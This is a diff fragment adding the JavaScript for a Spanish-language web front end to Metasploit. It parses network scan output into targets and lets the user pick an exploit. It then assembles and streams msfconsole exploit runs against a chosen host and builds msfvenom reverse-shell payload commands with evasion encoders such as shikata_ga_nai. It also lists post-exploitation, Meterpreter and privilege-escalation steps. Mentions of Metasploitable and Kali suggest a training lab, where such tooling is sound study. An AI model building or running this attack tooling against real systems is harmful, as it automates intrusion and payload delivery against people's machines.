+    if(e.data==='__DONE__'){scanESS.close();scanESS=null;document.getElementById('btn-scan').style.display='inline-flex';document.getElementById('btn-stop').style.display='none';document.getElementById('scan-title').textContent='terminal — completado';parseHosts(out.innerText);return;}
+    appendLine(out,e.data);
+  };
+  scanESS.onerror=()=>{appendLine(out,'ERROR: Conexion perdida.','terr');scanESS.close();scanESS=null;document.getElementById('btn-scan').style.display='inline-flex';document.getElementById('btn-stop').style.display='none';};
+}
+
+function stopScan(){if(scanESS){scanESS.close();scanESS=null;}document.getElementById('btn-scan').style.display='inline-flex';document.getElementById('btn-stop').style.display='none';parseHosts(document.getElementById('scan-out').innerText);}
+
+function parseHosts(text){
+  const hosts=[];const seen=new Set();
+  text.split('\n').forEach(line=>{
+    const ips=line.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
+    if(ips)ips.forEach(ip=>{
+      if(!seen.has(ip)&&!ip.startsWith('127.')&&!ip.endsWith('.0')&&!ip.endsWith('.255')){
+        seen.add(ip);
+        let ports='—';const pm=line.match(/(\d+)\/tcp/g);
+        if(pm)ports=pm.map(p=>p.replace('/tcp','')).join(', ');
+        let name='Host';
+        if(line.toLowerCase().includes('windows'))name='Windows Host';
+        else if(line.toLowerCase().includes('linux')||line.toLowerCase().includes('ubuntu'))name='Linux Host';
+        else if(line.toLowerCase().includes('metasploitable'))name='Metasploitable';
+        hosts.push({ip,name,ports});
+      }
+    });
+  });
+  if(hosts.length>0)renderHosts(hosts);
+}
+
+function renderHosts(hosts){
+  const wrap=document.getElementById('hosts-wrap');
+  document.getElementById('hosts-count').textContent=`(${hosts.length} hosts)`;
+  document.getElementById('hosts-list').innerHTML=hosts.map((h,i)=>`
+    <div class="host-item" id="hi-${i}">
+      <div class="host-ip">${h.ip}</div>
+      <div class="host-info"><div class="host-name">${h.name}</div><div class="host-ports">puertos: ${h.ports}</div></div>
+      <button class="sel-btn" onclick="selectTarget('${h.ip}','${h.name}',${i})">Seleccionar</button>
+    </div>`).join('');
+  wrap.style.display='block';
+  document.getElementById('nb-scan').textContent=hosts.length+' hosts';
+  document.getElementById('nb-scan').className='nbadge ok';
+}
+
+function selectTarget(ip,name,idx){
+  targetIP=ip;
+  document.querySelectorAll('.host-item').forEach(h=>h.classList.remove('chosen'));
+  document.getElementById('hi-'+idx).classList.add('chosen');
+  document.querySelectorAll('.sel-btn').forEach(b=>{b.textContent='Seleccionar';b.className='sel-btn';});
+  const btn=document.getElementById('hi-'+idx).querySelector('.sel-btn');
+  btn.textContent='Seleccionado';btn.className='sel-btn done';
+  document.getElementById('disp-ip').textContent=ip;
+  document.getElementById('disp-name').textContent=name;
+  document.getElementById('cfg-rhosts').value=ip;
+  document.getElementById('nb-expl').className='nbadge ok';
+  showPanel('exploits',document.querySelector('[data-panel=exploits]'));
+  showToast('Target: '+ip);
+}
+
+function setFilter(f,el){activeFilter=f;document.querySelectorAll('.fbtn').forEach(b=>b.classList.remove('on'));el.classList.add('on');renderExploits();}
+
+function renderExploits(){
+  const q=(document.getElementById('exploit-search').value||'').toLowerCase();
+  const catCls={web:'cat-web',smb:'cat-smb',ftp:'cat-ftp',irc:'cat-irc',net:'cat-net',ssh:'cat-ssh',db:'cat-db'};
+  const rkCls={excellent:'exc',great:'grt',good:'goo'};
+  const filtered=exploitsData.filter(e=>{
+    const mc=activeFilter==='all'||e.cat===activeFilter;
+    const mq=!q||e.short.toLowerCase().includes(q)||e.desc.toLowerCase().includes(q)||e.cve.toLowerCase().includes(q)||e.port.toLowerCase().includes(q);
+    return mc&&mq;
+  });
+  const c=document.getElementById('exploit-list');
+  if(!filtered.length){c.innerHTML='<div class="card"><span style="color:var(--muted);font-family:var(--mono);font-size:12px;">Sin resultados.</span></div>';return;}
+  c.innerHTML=filtered.map(e=>`
+    <div class="exploit-item${selExploit&&selExploit.id===e.id?' sel':''}" id="ei-${e.id}" onclick="pickExploit('${e.id}')">
+      <span class="erank ${rkCls[e.rank]||'goo'}">${e.rank.toUpperCase()}</span>
+      <div class="einfo">
+        <div class="ename">${e.short}${e.cve!=='—'?`<span class="cvetag">${e.cve}</span>`:''}<span class="cattag ${catCls[e.cat]||''}">${e.cat}</span></div>
+        <div class="edesc">${e.desc}</div>
+        <div class="eport">${e.port} — ${e.targets.join(', ')}</div>
+      </div>
+    </div>`).join('');
+}
+
+function pickExploit(id){
+  selExploit=exploitsData.find(e=>e.id===id);
+  renderExploits();
+  document.getElementById('nb-cfg').textContent=selExploit.short.split(' ')[0];
+  document.getElementById('nb-cfg').className='nbadge ok';
+  renderConfig();
+  showPanel('config',document.querySelector('[data-panel=config]'));
+}
+
+function renderConfig(){
+  if(!selExploit)return;
+  const e=selExploit;
+  document.getElementById('cfg-empty').style.display='none';
+  document.getElementById('cfg-main').style.display='block';
+  const catCls={web:'ch-cyan',smb:'ch-red',ftp:'ch-amber',irc:'ch-green',net:'ch-cyan',ssh:'ch-blue',db:'ch-amber'};
+  document.getElementById('cfg-chips').innerHTML=`<span class="chip ch-blue">${e.rank}</span>${e.sev>0?`<span class="chip ch-${e.sev>80?'red':e.sev>60?'amber':'blue'}">sev: ${e.sev}/100</span>`:''}<span class="chip ${catCls[e.cat]||'ch-cyan'}">${e.cat}</span><span class="chip ch-cyan">${e.port}</span>${e.cve!=='—'?`<span class="chip ch-red">${e.cve}</span>`:''}`;
+  document.getElementById('cfg-note').textContent=e.note;
+  const opts={...e.opts};
+  if('RHOSTS'in opts)opts.RHOSTS=targetIP||'TARGET_IP';
+  if('LHOST'in opts)opts.LHOST=document.getElementById('cfg-lhost').value;
+  document.getElementById('cfg-opts').innerHTML=Object.entries(opts).map(([k,v])=>`<div class="opt-row"><div class="ok2">${k}</div><div class="ov">${v||'—'}</div></div>`).join('');
+  if('RHOSTS'in e.opts)document.getElementById('cfg-rhosts').value=targetIP;
+  if('RPORT'in e.opts)document.getElementById('cfg-rport').value=e.opts.RPORT;
+}
+
+function prepLaunch(){
+  if(!selExploit)return;
+  const e=selExploit;
+  const rh=document.getElementById('cfg-rhosts').value||targetIP||'TARGET_IP';
+  const lh=document.getElementById('cfg-lhost').value;
+  const lp=document.getElementById('cfg-lport').value;
+  const rp=document.getElementById('cfg-rport').value||e.opts.RPORT||'';
+  const steps=[];
+  steps.push({t:'Cargar modulo',c:`use ${e.name}`});
+  if('RHOSTS'in e.opts)steps.push({t:'Target IP',c:`set RHOSTS ${rh}`});
+  if('RPORT'in e.opts)steps.push({t:'Puerto objetivo',c:`set RPORT ${rp}`});
+  if('LHOST'in e.opts)steps.push({t:'Tu IP Kali',c:`set LHOST ${lh}`});
+  if('LPORT'in e.opts)steps.push({t:'Puerto escucha',c:`set LPORT ${lp}`});
+  if('TARGETURI'in e.opts)steps.push({t:'URI objetivo',c:`set TARGETURI ${e.opts.TARGETURI}`});
+  if('HTTPUSERNAME'in e.opts)steps.push({t:'Credenciales',c:`set HTTPUSERNAME ${e.opts.HTTPUSERNAME}`});
+  if(e.payload&&!e.payload.startsWith('('))steps.push({t:'Payload',c:`set payload ${e.payload}`});
+  steps.push({t:'Revisar opciones',c:'show options'});
+  steps.push({t:'Ejecutar',c:'run'});
+  document.getElementById('launch-empty').style.display='none';
+  document.getElementById('launch-main').style.display='block';
+  document.getElementById('launch-steps').innerHTML=steps.map((s,i)=>`
+    <div class="step" onclick="copyStep('${s.c.replace(/'/g,"\\'")}',this)">
+      <div class="snum">${i+1}</div>
+      <div style="flex:1"><div class="stxt">${s.t}</div><div class="scmd">${s.c}</div></div>
+      <span class="scopy">copiar</span>
+    </div>`).join('');
+  document.getElementById('nb-launch').textContent='listo';
+  document.getElementById('nb-launch').className='nbadge ok';
+  showPanel('launch',document.querySelector('[data-panel=launch]'));
+}
+
+function runMSF(){
+  if(!selExploit)return;
+  if(msfESS)msfESS.close();
+  const rh=document.getElementById('cfg-rhosts').value||targetIP;
+  const lh=document.getElementById('cfg-lhost').value;
+  const lp=document.getElementById('cfg-lport').value;
+  const out=document.getElementById('msf-out');
+  out.innerHTML='';
+  document.getElementById('btn-msf-run').style.display='none';
+  document.getElementById('btn-msf-stop').style.display='inline-flex';
+  document.getElementById('msf-title').innerHTML='<span class="scanning-anim">METASPLOIT CORRIENDO...</span>';
+  const url=`/api/msf/stream?exploit=${selExploit.id}&target=${encodeURIComponent(rh)}&lhost=${encodeURIComponent(lh)}&lport=${encodeURIComponent(lp)}`;
+  msfESS=new EventSource(url);
+  msfESS.onmessage=(e)=>{
+    if(e.data==='__DONE__'){msfESS.close();msfESS=null;document.getElementById('btn-msf-run').style.display='inline-flex';document.getElementById('btn-msf-stop').style.display='none';document.getElementById('msf-title').textContent='msfconsole — finalizado';return;}
+    appendLine(out,e.data,colorLine(e.data));
+  };
+  msfESS.onerror=()=>{appendLine(out,'ERROR: Conexion perdida.','terr');msfESS.close();msfESS=null;document.getElementById('btn-msf-run').style.display='inline-flex';document.getElementById('btn-msf-stop').style.display='none';};
+}
+
+function stopMSF(){if(msfESS){msfESS.close();msfESS=null;}document.getElementById('btn-msf-run').style.display='inline-flex';document.getElementById('btn-msf-stop').style.display='none';}
+function downloadRC(){if(!selExploit)return;const rh=document.getElementById('cfg-rhosts').value||targetIP;const lh=document.getElementById('cfg-lhost').value;const lp=document.getElementById('cfg-lport').value;window.location=`/api/rc/download?exploit=${selExploit.id}&target=${encodeURIComponent(rh)}&lhost=${encodeURIComponent(lh)}&lport=${encodeURIComponent(lp)}`;}
+
+// ── PAYLOADS ──
+function renderPayloadGrid(){
+  const osColor={'Linux':'os-linux','Windows':'os-windows','Web (PHP)':'os-web','Tomcat / JBoss / GlassFish':'os-java','Windows (IIS)':'os-windows','Windows (PowerShell)':'os-windows','Linux/Mac (Python)':'os-linux','Linux/Unix (Bash)':'os-linux'};
+  document.getElementById('payload-grid').innerHTML=Object.entries(payloadTemplates).map(([id,t])=>`
+    <div class="pcard${selPayloadId===id?' sel':''}" id="pc-${id}" onclick="pickPayload('${id}')">
+      <div class="pcard-name">${t.name}</div>
+      <div class="pcard-os ${osColor[t.os]||'os-linux'}">${t.os}</div>
+      <div class="pcard-note">${t.payload}</div>
+    </div>`).join('');
+}
+
+function pickPayload(id){
+  selPayloadId=id;
+  const t=payloadTemplates[id];
+  document.querySelectorAll('.pcard').forEach(c=>c.classList.remove('sel'));
+  document.getElementById('pc-'+id).classList.add('sel');
+  document.getElementById('payload-cfg-card').style.display='block';
+  document.getElementById('pv-result').style.display='none';
+  document.getElementById('payload-term').style.display='none';
+
+  const lh=document.getElementById('pv-lhost').value;
+  const lp=document.getElementById('pv-lport').value;
+  document.getElementById('payload-chips').innerHTML=`<span class="chip ch-purple">${t.fmt}</span><span class="chip ch-cyan">${t.os}</span><span class="chip ch-blue">${t.payload}</span>`;
+  document.getElementById('payload-note').textContent=t.note;
+  updatePayloadCmd();
+}
+
+function updatePayloadCmd(){
+  if(!selPayloadId)return;
+  const t=payloadTemplates[selPayloadId];
+  const lh=document.getElementById('pv-lhost').value;
+  const lp=document.getElementById('pv-lport').value;
+  const enc=document.getElementById('pv-encoder').value;
+  const bc=document.getElementById('pv-badchars').value;
+  const encoders={'none':'','x86_shikata':'-e x86/shikata_ga_nai -i 5','x64_xor':'-e x64/xor_dynamic -i 3','base64':'-e php/base64','unicode':'-e x86/unicode_mixed -i 3'};
+  const encFlag=encoders[enc]||'';
+  let cmd=`msfvenom -p ${t.payload} LHOST=${lh} LPORT=${lp} -f ${t.fmt}`;
+  if(encFlag)cmd+=' '+encFlag;
+  if(bc)cmd+=` -b '${bc}'`;
+  cmd+=` -o payload.${t.ext}`;
+  document.getElementById('pv-cmd-preview').textContent=cmd;
+}
+
+document.addEventListener('DOMContentLoaded',()=>{
+  ['pv-lhost','pv-lport','pv-encoder','pv-badchars'].forEach(id=>{
+    const el=document.getElementById(id);
+    if(el)el.addEventListener('input',updatePayloadCmd);
+  });
+});
+
+function genPayload(){
+  if(!selPayloadId)return;
+  if(pvESS)pvESS.close();
+  const lh=document.getElementById('pv-lhost').value;
+  const lp=document.getElementById('pv-lport').value;
+  const enc=document.getElementById('pv-encoder').value;
+  const bc=document.getElementById('pv-badchars').value;
+  const out=document.getElementById('pv-out');
+  out.innerHTML='';
+  document.getElementById('payload-term').style.display='block';
+  document.getElementById('pv-result').style.display='none';
+  document.getElementById('pv-title').innerHTML='<span class="scanning-anim">GENERANDO PAYLOAD...</span>';
+  const url=`/api/payload/stream?template=${selPayloadId}&lhost=${encodeURIComponent(lh)}&lport=${encodeURIComponent(lp)}&encoder=${encodeURIComponent(enc)}&badchars=${encodeURIComponent(bc)}`;
+  pvESS=new EventSource(url);
+  pvESS.onmessage=(e)=>{
+    if(e.data==='__DONE__'){pvESS.close();pvESS=null;document.getElementById('pv-title').textContent='msfvenom — completado';return;}
+    if(e.data.startsWith('__FILE__:')){
+      const parts=e.data.split(':');const filepath=parts[1];const ext=parts[2];
+      const tpl=payloadTemplates[selPayloadId];
+      document.getElementById('pv-deliver').textContent='Como usarlo: '+tpl.deliver;
+      document.getElementById('pv-dl-link').href=`/api/payload/download?file=${encodeURIComponent(filepath)}`;
+      document.getElementById('pv-result').style.display='block';
+      return;
+    }
+    appendLine(out,e.data,e.data.startsWith('[+]')?'ts':e.data.startsWith('[-]')||e.data.startsWith('ERROR')?'terr':e.data.startsWith('[*]')?'ti2':'tc');
+  };
+  pvESS.onerror=()=>{appendLine(out,'ERROR: Conexion perdida.','terr');pvESS.close();pvESS=null;document.getElementById('pv-title').textContent='msfvenom — error';};
+}
+
+// ── POST ──
+function renderPost(){
+  document.getElementById('post-steps').innerHTML=POST_STEPS.map((s,i)=>`<div class="step" onclick="copyStep('${s.c}',this)"><div class="snum">${i+1}</div><div style="flex:1"><div class="stxt">${s.t}</div><div class="scmd">${s.c}</div></div><span class="scopy">copiar</span></div>`).join('');
+  document.getElementById('meterp-cmds').innerHTML=METERP.map(s=>`<div class="step" onclick="copyStep('${s.c.replace(/'/g,"\\'")}',this)"><div class="snum">-</div><div style="flex:1"><div class="stxt">${s.t}</div><div class="scmd">${s.c}</div></div><span class="scopy">copiar</span></div>`).join('');
+  document.getElementById('privesc-cmds').innerHTML=PRIVESC.map(s=>`<div class="step" onclick="copyStep('${s.c.replace(/'/g,"\\'")}',this)"><div class="snum">-</div><div style="flex:1"><div class="stxt">${s.t}</div><div class="scmd">${s.c}</div></div><span class="scopy">copiar</span></div>`).join('');
+}
+
+// ── UTILS ──
+function appendLine(container,text,cls){
+  const span=document.createElement('span');
+  span.className='t-line '+(cls||colorLine(text));
+  span.textContent=text;
+  container.appendChild(span);
+  container.scrollTop=container.scrollHeight;
+}
+function colorLine(l){
+  if(l.startsWith('[+]'))return 'ts';
+  if(l.startsWith('[-]')||l.startsWith('ERROR'))return 'terr';
+  if(l.startsWith('[*]'))return 'ti2';
+  if(l.startsWith('[!]'))return 'to';
+  if(l.includes('Meterpreter session')||l.includes('session opened'))return 'tsess';
+  if(l.startsWith('msf6')||l.startsWith('meterpreter')||l.startsWith('$'))return 'tp';
+  if(l.startsWith('#')||l.startsWith('CMD:'))return 'tm';
+  return 'tc';
+}
+function clearT(id){document.getElementById(id).innerHTML='';}
+function copyStep(cmd,el){navigator.clipboard.writeText(cmd).catch(()=>{});el.querySelectorAll('.snum').forEach(n=>{n.classList.add('done');n.textContent='v';});showToast('Copiado!');}
+function showToast(msg){const t=document.getElementById('toast');t.textContent=msg||'Copiado!';t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2000);}
+</script>
+</body>
+</html>
